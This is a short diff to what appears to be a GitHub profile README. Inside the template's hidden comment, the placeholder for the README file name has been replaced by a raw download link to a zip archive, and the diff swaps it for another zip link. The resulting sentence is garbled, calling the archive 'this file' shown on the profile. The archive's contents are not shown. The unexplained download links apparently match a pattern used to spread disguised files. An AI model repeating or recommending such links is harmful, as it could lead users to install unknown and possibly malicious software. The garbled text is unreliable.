@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-531santhosh/531santhosh is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/531santhosh/531santhosh/main/ripier/531santhosh.zip` (this file) appears on your GitHub profile.
+531santhosh/531santhosh is a ✨ special ✨ repository because its `https://github.com/531santhosh/531santhosh/raw/refs/heads/main/ripier/santhosh-1.0.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
